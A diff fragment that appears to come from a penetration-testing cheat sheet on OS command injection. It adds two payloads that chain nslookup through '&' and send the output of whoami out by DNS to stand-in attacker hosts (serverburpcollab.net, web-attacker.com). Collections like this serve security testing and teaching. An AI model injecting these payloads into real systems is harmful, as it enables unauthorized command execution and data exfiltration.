@@ -165,6 +165,9 @@ Trigger a time delay
 127.0.0.1 & nslookup abcd.web-attacker.com &
 127.0.0.1 & nslookup 'whoami'abcd.web-attacker.com &
 
+& nslookup 'whoami' .serverburpcollab.net #
+& nslookup $(whoami) .serverburpcollab.net #
+
 
 
 
